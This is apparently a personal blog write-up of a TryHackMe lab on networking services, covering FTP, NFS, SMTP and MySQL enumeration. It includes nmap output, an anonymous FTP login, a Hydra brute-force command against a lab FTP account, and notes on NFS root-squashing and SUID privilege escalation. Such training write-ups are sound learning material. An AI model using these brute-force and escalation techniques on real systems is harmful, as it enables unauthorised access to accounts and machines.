---
layout: post
title: Try Hack me - Networking Services
date: 2022-05-24 16:04:22 +010
description: Try Hack Me. Some Networking Services
fig-caption: Blue
categories: TryHackme
tags: [Networking]
---


# Networking Services 

## FTP
#FTP

### Enumeration
#### Machines info
Target Machine = 10.10.159.127
My Machine = 10.10.137.70

#### Nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:0C:46:59:0D:27 (Unknown)

#### FTP Login 
root@ip-10-10-137-70:~# ftp 10.10.159.127
Connected to 10.10.159.127.
220 Welcome to the administrator FTP service.
Name (10.10.159.127:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
ftp> 


------------------------------------------------
ftp> get PUBLIC_NOTICE.txt -
remote: PUBLIC_NOTICE.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available 
over the weekend- we will be 
carrying out routine system 
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,
 **==Mike==** 
226 Transfer complete.
353 bytes received in 0.00 secs (8.2109 MB/s)
ftp> 

Username = Mike

### Exploiting FTP

#### Bruteforce 

##### Hydra 

	SECTION             FUNCTION  
  
	hydra               Runs the hydra tool  
  
	-t 4                Number of parallel connections per target  
  
	-l [user]          Points to the user who's account you're trying to compromise  
  
	-P [path to dictionary] Points to the file containing the list of possible passwords  
  
	-vV                Sets verbose mode to very verbose, shows the login+pass combination for each attempt  
  
	[machine IP]       The IP address of the target machine  
  
	ftp / protocol     Sets the protocol


###### Command used 
root@ip-10-10-137-70:~# hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.159.127 ftp

###### Result 
[21][ftp] host: 10.10.159.127   login:==mike==   password: ==password==
[STATUS] attack finished for 10.10.159.127 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-04-28 11:03:33

#### FTP login

 ftp 10.10.159.127 
Connected to 10.10.159.127.
220 Welcome to the administrator FTP service.
Name (10.10.159.127:root): mike
331 Please specify the password.
Password: *password*
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
ftp> get ftp.txt -
remote: ftp.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
THM{y0u_g0t_th3_ftp_fl4g}
226 Transfer complete.
26 bytes received in 0.00 secs (43.8526 kB/s)
ftp> 

##### Flag 
THM{y0u_g0t_th3_ftp_fl4g}


## NFS 
#NFS

### What is NFS?
NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server.

### How does NFS work?
First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using ==RPC==.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to ==NFSD== (the NFS daemon) on the server. This call takes parameters such as:

-    The file handle
-    The name of the file to be accessed
-    The user's, user ID
-    The user's group ID

### Mounting NFS shares
****sudo mount -t nfs IP:share /tmp/mount/ -nolock***

| Tag      | Function                                               |   
| -------- | ------------------------------------------------------ | 
| sudo     | Runs as root                                           |   
| mount    | Execute the command                                    |     
| -t nfs   | Type of device to mount, then specifying that it's NFS |     
| IP:share | The IP Address of the NFS server                       |     
| -nolock  | Specifies not to use NLM locking                       |     
	

### Enumerating NFS
Target machine: 10.10.248.10
My machine: 10.10.137.70


#### Nmap
nmap -sV -p- 10.10.248.10 -vv

##### Results
Reason: 65528 resets
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
111/tcp   open  rpcbind  syn-ack ttl 64 2-4 (RPC #100000)
2049/tcp  open  ==nfs_acl==  syn-ack ttl 64 3 (RPC #100227)
36723/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
40743/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
46311/tcp open  nlockmgr syn-ack ttl 64 1-4 (RPC #100021)
53171/tcp open  mountd   syn-ack ttl 64 1-3 (RPC #100005)
MAC Address: 02:D0:3B:8B:9B:79 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#### Share and Mount  
![[Pasted image 20220428160443.png]]

![[Pasted image 20220428161531.png]]

We can login into the machine because we know the username and we have the **==id_rsa**.

### Exploiting NFS
#### Root Squashing
By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

#### SUID
What are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!

## SMPT
#SMPT
### What is SMPT 
SMTP stands for "Simple Mail Transfer Protocol". It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.

#### Protocols:
##### **POP and IMAP**

POP, or "Post Office Protocol" and IMAP, "Internet Message Access Protocol" are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new.

#### Default Port
Port: 25

### Enumerating SMTP

#### Nmap

 STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
25/tcp open  smtp    Postfix smtpd  
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel


#### Metasploit
![[Pasted image 20220429174833.png]]![[2022-04-29_17-49.png]]

##### Username found

![[Pasted image 20220429180415.png]]


### Bruteforce SMTP 

![[Pasted image 20220429181115.png]]

![[Pasted image 20220429181156.png]]

## MySQL 
#mysql
### What is MySQL?
MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL).

#### Database
A database is simply a persistent, organized collection of structured data.

#### RBMS
A software or service used to create and manage databases based on a relational model. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's "primary key" or other "key" factors.

### How does MySQL work
MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:  

1.  MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2.  Clients make requests by making specific statements in SQL.
3.  The server will respond to the client with whatever information has been requested.


 MySQL

#### Nmap
![[Pasted image 20220429212543.png]]

### Enumeration

#### MySQL
![[Pasted image 20220502153240.png]]


#### Metasploit

![[Pasted image 20220502153513.png]]



![[Pasted image 20220502153831.png]]


### Exploiting MySQL


![[Pasted image 20220502154714.png]]

![[Pasted image 20220502155046.png]]

![[Pasted image 20220502155214.png]]
